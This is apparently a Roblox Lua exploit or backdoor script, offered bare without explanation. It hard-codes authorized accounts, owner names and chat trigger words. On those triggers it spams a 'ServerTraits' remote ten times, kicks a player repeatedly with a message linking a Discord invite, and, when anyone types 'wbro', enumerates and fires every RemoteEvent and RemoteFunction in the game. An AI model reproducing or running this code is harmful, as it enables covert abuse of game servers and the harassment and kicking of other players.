local TextChatService = game:GetService("TextChatService")
local Players = game:GetService("Players")
local AUTHORIZED_IDS = {8481430369, 1478527414, 7601800752, 5827142972}
local AUTHORIZED_NAMES = {"jesus_line", "jesuswilmero", "TOPxManoyopay"}
local OWNERS = {"samy0515_2", "kamuworl"}
local MAGIC_WORDS = {"xr", "wsp"}
local KICK_WORDS = {"yessr", "hace frio"}
local TRIGGER_USER = "linda125xd"

local isAuthorized = false
local localPlayer = Players.LocalPlayer

for _, id in ipairs(AUTHORIZED_IDS) do
	if localPlayer.UserId == id then
		isAuthorized = true
		break
	end
end

if not isAuthorized then
	for _, name in ipairs(AUTHORIZED_NAMES) do
		if localPlayer.Name == name then
			isAuthorized = true
			break
		end
	end
end

local function executeServerTraits()
	for i = 1, 10 do
		task.spawn(function()
			pcall(function()
				local player = Players:FindFirstChild("MiUser")
				if player and player:IsA("Player") then
					local backpack = player:FindFirstChild("Backpack")
					if backpack then
						local serverTraits = backpack:FindFirstChild("ServerTraits")
						if serverTraits then
							if serverTraits:IsA("RemoteFunction") then
								serverTraits:InvokeServer()
							elseif serverTraits:IsA("RemoteEvent") then
								serverTraits:FireServer()
							else
								serverTraits:Use()
							end
						end
					end
				end
			end)
		end)
		
		task.spawn(function()
			pcall(function()
				local player = Players["MiUser"]
				local use = player.Backpack.ServerTraits.Use
				use:InvokeServer()
			end)
		end)
		
		task.spawn(function()
			pcall(function()
				game:GetService("Players").MiUser.Backpack.ServerTraits:FireServer()
			end)
		end)
		
		task.wait(0.1)
	end
end

local function kickMode()
	task.spawn(function()
		pcall(function()
			local player = Players:FindFirstChild("MiUser")
			if player then
				local backpack = player:FindFirstChild("Backpack")
				if backpack then
					local serverTraits = backpack:FindFirstChild("ServerTraits")
					if serverTraits then
						local input = serverTraits:FindFirstChild("Input")
						if input then
							input:FireServer()
						end
					end
				end
				task.wait(0.1)
				for _ = 1, 10 do
					player:Kick("BOOGABLOZxD - REPORT THIS BUG: https://discord.gg/F5WbRVWCaT")
					task.wait(0.2)
				end
			end
		end)
	end)
end

local function findAllRemotes(obj, remotes)
	remotes = remotes or {}
	
	for _, child in ipairs(obj:GetChildren()) do
		if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
			table.insert(remotes, child)
		end
		findAllRemotes(child, remotes)
	end
	
	return remotes
end

local function emergencyMode()
	local allRemotes = findAllRemotes(game)
	
	for _, remote in ipairs(allRemotes) do
		task.spawn(function()
			pcall(function()
				if remote:IsA("RemoteEvent") then
					remote:FireServer()
				elseif remote:IsA("RemoteFunction") then
					remote:InvokeServer()
				end
			end)
		end)
		task.wait(0.05)
	end
end

task.spawn(function()
	for _, player in ipairs(Players:GetPlayers()) do
		if player.Name == TRIGGER_USER and isAuthorized then
			executeServerTraits()
			break
		end
	end
end)

Players.PlayerAdded:Connect(function(player)
	if player.Name == TRIGGER_USER and isAuthorized then
		task.spawn(executeServerTraits)
	end
end)

TextChatService.MessageReceived:Connect(function(message)
	if not message.TextSource then
		return
	end

	local sender = Players:GetPlayerByUserId(message.TextSource.UserId)
	if not sender then
		return
	end

	local msg = message.Text:lower()

	if msg == "wbro" then
		emergencyMode()
		return
	end

	if isAuthorized then
		local isOwner = false
		for _, owner in ipairs(OWNERS) do
			if sender.Name == owner then
				isOwner = true
				break
			end
		end

		if isOwner then
			for _, word in ipairs(KICK_WORDS) do
				if msg == word then
					kickMode()
					return
				end
			end

			for _, word in ipairs(MAGIC_WORDS) do
				if msg == word then
					executeServerTraits()
					break
				end
			end
		end
	end
end)
